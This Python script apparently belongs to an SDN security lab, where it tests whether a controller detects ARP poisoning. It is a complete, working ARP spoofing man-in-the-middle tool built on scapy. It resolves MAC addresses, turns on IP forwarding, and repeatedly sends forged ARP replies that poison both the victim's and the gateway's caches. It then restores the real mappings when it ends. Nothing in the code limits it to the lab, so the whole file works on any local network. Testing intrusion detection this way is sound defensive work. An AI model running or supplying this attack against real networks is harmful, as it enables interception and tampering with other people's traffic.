#!/usr/bin/env python3
"""
arp_attack.py - ARP Spoofing Attack
Tests Layer 1 (DAI) detection in enhanced controller.

Usage:
  sudo python3 arp_attack.py \
    --victim 10.0.2.1 \
    --gateway 10.0.2.254 \
    --duration 60 \
    --interface h1-eth0

This attack:
  1. Sends spoofed ARP replies claiming to be the gateway
  2. Sends spoofed ARP replies claiming to be the victim
  3. Victims route traffic through attacker (MITM relay)
  4. Controller detects ARP poisoning and blocks attacker
"""

import argparse
import time
import sys
from scapy.all import ARP, send, get_if_hwaddr, srp, Ether

def get_mac(ip, iface):
    """Resolve IP to MAC address using ARP"""
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2,
            iface=iface,
            verbose=False
        )
        return ans[0][1].hwsrc if ans else None
    except Exception as e:
        print(f"[!] Error resolving {ip}: {e}")
        return None

def send_arp_spoofed(victim_ip, victim_mac, spoof_ip, attacker_mac, iface):
    """Send a single spoofed ARP reply"""
    pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    send(pkt, iface=iface, verbose=False)

def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing MITM Attack for SDN Detection Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Attack h3 (10.0.2.1) via its gateway (10.0.2.254) for 60 seconds
  sudo python3 arp_attack.py \\
    --victim 10.0.2.1 \\
    --gateway 10.0.2.254 \\
    --duration 60 \\
    --interface h1-eth0

  # Attack h4 (10.0.2.2) for 30 seconds
  sudo python3 arp_attack.py \\
    --victim 10.0.2.2 \\
    --gateway 10.0.2.254 \\
    --duration 30 \\
    --interface h1-eth0
        """
    )
    parser.add_argument("--victim", required=True, help="Victim IP address (e.g., 10.0.2.1)")
    parser.add_argument("--gateway", required=True, help="Gateway IP address (e.g., 10.0.2.254)")
    parser.add_argument("--duration", type=int, required=True, help="Attack duration in seconds")
    parser.add_argument("--interface", required=True, help="Network interface (e.g., h1-eth0)")
    parser.add_argument("--interval", type=float, default=2, help="Interval between ARP pairs (default: 2s)")
    
    args = parser.parse_args()
    
    victim_ip = args.victim
    gateway_ip = args.gateway
    iface = args.interface
    duration = args.duration
    interval = args.interval
    
    print("[*] ARP Spoofing Attack Initialization")
    print(f"    Victim:    {victim_ip}")
    print(f"    Gateway:   {gateway_ip}")
    print(f"    Interface: {iface}")
    print(f"    Duration:  {duration}s")
    print(f"    Interval:  {interval}s")
    
    # Resolve MACs
    print("\n[*] Resolving MAC addresses...")
    victim_mac = get_mac(victim_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    attacker_mac = get_if_hwaddr(iface)
    
    if not victim_mac:
        print(f"[!] Error: Could not resolve {victim_ip}")
        sys.exit(1)
    if not gateway_mac:
        print(f"[!] Error: Could not resolve {gateway_ip}")
        sys.exit(1)
    
    print(f"    Victim MAC:    {victim_mac}")
    print(f"    Gateway MAC:   {gateway_mac}")
    print(f"    Attacker MAC:  {attacker_mac}")
    
    # Enable IP forwarding on attacker
    print("\n[*] Enabling IP forwarding...")
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')
        print("[+] IP forwarding enabled")
    except Exception as e:
        print(f"[!] Warning: Could not enable IP forwarding: {e}")
        print("    (This may reduce MITM effectiveness)")
    
    # Start attack
    print(f"\n[*] Starting ARP spoofing attack...")
    print("    Sending: victim→gateway as attacker, gateway→victim as attacker")
    print("="*70)
    
    start_time = time.time()
    packet_pairs = 0
    total_packets = 0
    
    try:
        while time.time() - start_time < duration:
            # Poison victim: tell it attacker is the gateway
            send_arp_spoofed(victim_ip, victim_mac, gateway_ip, attacker_mac, iface)
            
            # Poison gateway: tell it attacker is the victim
            send_arp_spoofed(gateway_ip, gateway_mac, victim_ip, attacker_mac, iface)
            
            packet_pairs += 1
            total_packets += 2
            elapsed = int(time.time() - start_time)
            
            print(f"[+] Pairs: {packet_pairs:3d} | Total: {total_packets:4d} | Elapsed: {elapsed:3d}s | "
                  f"Rate: {total_packets/(elapsed+1):.1f} pkt/s")
            
            time.sleep(interval)
    
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user")
    
    finally:
        print("\n" + "="*70)
        print("[*] Cleaning up...")
        
        # Restore ARP entries with legitimate mappings
        print("[*] Restoring ARP cache...")
        for _ in range(5):
            # Tell victim the correct gateway MAC
            send_arp_spoofed(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
            # Tell gateway the correct victim MAC
            send_arp_spoofed(gateway_ip, gateway_mac, victim_ip, victim_mac, iface)
            time.sleep(0.5)
        
        # Disable IP forwarding
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0\n')
            print("[+] IP forwarding disabled")
        except Exception as e:
            print(f"[!] Warning: Could not disable IP forwarding: {e}")
        
        # Print statistics
        elapsed = int(time.time() - start_time)
        print("\n" + "="*70)
        print("[*] Attack Statistics:")
        print(f"    Packet pairs sent: {packet_pairs}")
        print(f"    Total ARP packets: {total_packets}")
        print(f"    Duration:          {elapsed} seconds")
        if packet_pairs > 0:
            print(f"    Avg interval:      {elapsed / packet_pairs:.2f}s")
            print(f"    Throughput:        {total_packets / (elapsed + 1):.2f} pkt/s")
        print("="*70)

if __name__ == "__main__":
    main()